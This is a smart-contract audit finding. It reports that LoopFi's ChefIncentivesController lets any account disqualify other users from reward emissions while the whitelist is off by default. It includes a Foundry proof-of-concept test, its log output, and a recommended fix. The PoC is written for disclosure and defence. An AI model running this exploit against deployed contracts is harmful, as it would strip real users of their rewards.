# Vulnerability details

## Impact
Anyone can call `manualStopEmissionsFor` [1](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/ChefIncentivesController.sol#L813-L846) if `whitelistActive` [2](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/ChefIncentivesController.sol#L211) is false. This is the default behavior of ChefIncentivesController and would allow anyone to disqualify another user.

## Proof of Concept

First create a `EligibilityDataProvider` and a `ChefIncentivesController` and configure them.
Calling `incentivesController.manualStopAllEmissionsFor(user);` from a newly created account with no whitelist access, the user gets disqualified. The POC produces the following logs:
- whitelistActive:  false
- exploiter whitelisted:  false
- dq time before:  0
- dq time after:  2592000

The POC is based on the existing `ChefIncentivesControllerTest` and should be placed in src/test/uint/poc.t.sol:
```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {TestBase} from "../TestBase.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import {WAD} from "../../utils/Math.sol";
import {IVaultRegistry} from "../../interfaces/IVaultRegistry.sol";
import {IMultiFeeDistribution} from "../../reward/interfaces/IMultiFeeDistribution.sol";
import {IPriceProvider} from "../../reward/interfaces/IPriceProvider.sol";
import {IChefIncentivesController} from "../../reward/interfaces/IChefIncentivesController.sol";
import {IEligibilityDataProvider} from "../../reward/interfaces/IEligibilityDataProvider.sol";
import {EligibilityDataProvider} from "../../reward/EligibilityDataProvider.sol";
import {ChefIncentivesController} from "../../reward/ChefIncentivesController.sol";

import {console} from "forge-std/console.sol";

contract POC_ChefIncentivesControllerTest is TestBase {
    EligibilityDataProvider eligibilityDataProvider;    
    ChefIncentivesController public incentivesController;

    address user = address(100);
    address exploiter = address(1337);
    uint256 public rewardsPerSecond = 0.01 ether;
    uint256 public endingTimeCadence = 2 days;

    function setUp() public virtual override {
        super.setUp();
        ERC20Mock loopToken = new ERC20Mock();

        address mockMultiFeeDistribution = vm.addr(uint256(keccak256("mockMultiFeeDistribution")));
        address mockVaultRegistry = vm.addr(uint256(keccak256("mockVaultRegistry")));
        address mockPriceProvider = vm.addr(uint256(keccak256("mockPriceProvider")));

        eligibilityDataProvider = EligibilityDataProvider(
            address(
                new ERC1967Proxy(
                    address(new EligibilityDataProvider()),
                    abi.encodeWithSelector(
                        EligibilityDataProvider.initialize.selector,
                        IVaultRegistry(address(mockVaultRegistry)),
                        IMultiFeeDistribution(address(mockMultiFeeDistribution)),
                        IPriceProvider(address(mockPriceProvider))
                    )
                )
            )
        );

        incentivesController = ChefIncentivesController(
            address(
                new ERC1967Proxy(
                    address(new ChefIncentivesController()),
                    abi.encodeWithSelector(
                        ChefIncentivesController.initialize.selector,
                        address(this),
                        eligibilityDataProvider,
                        IMultiFeeDistribution(mockMultiFeeDistribution),
                        rewardsPerSecond,
                        address(loopToken),
                        endingTimeCadence
                    )
                )
            )
        );

        eligibilityDataProvider.setChefIncentivesController(
            IChefIncentivesController(address(incentivesController))
        );
        
        vm.label(user, "user");
        vm.label(exploiter, "exploiter");
        vm.label(address(eligibilityDataProvider), "eligibilityDataProvider");
        vm.label(address(incentivesController), "incentivesController");
    }

    function test_whitelistPOC() public {
        console.log("whitelistActive: ", incentivesController.whitelistActive());
        console.log("exploiter whitelisted: ", incentivesController.whitelist(exploiter));
        console.log("dq time before: ", eligibilityDataProvider.getDqTime(user));

        vm.prank(exploiter);
        incentivesController.manualStopAllEmissionsFor(user);

        console.log("dq time after: ", eligibilityDataProvider.getDqTime(user));
    }
}
```

## Recommended Mitigation Steps
The default value for `whitelistActive` should be changed to true. Also consider removing the `whitelistActive` toggle, as `manualStopEmissionsFor` should always be a privileged function.
